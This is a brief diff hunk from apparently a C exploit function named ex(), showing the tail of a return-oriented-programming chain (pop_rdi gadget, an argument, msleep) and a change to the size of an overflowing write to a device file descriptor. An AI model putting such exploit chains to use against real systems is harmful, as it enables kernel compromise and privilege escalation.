@@ -95,7 +95,7 @@ void ex(){
     ret[9] = pop_rdi;
     ret[10] = 0x10000000;
     ret[11] = msleep;
-	write(fd, buf, 0x470);
+	write(fd, buf, 0x468);
 	close(fd);
 }
 
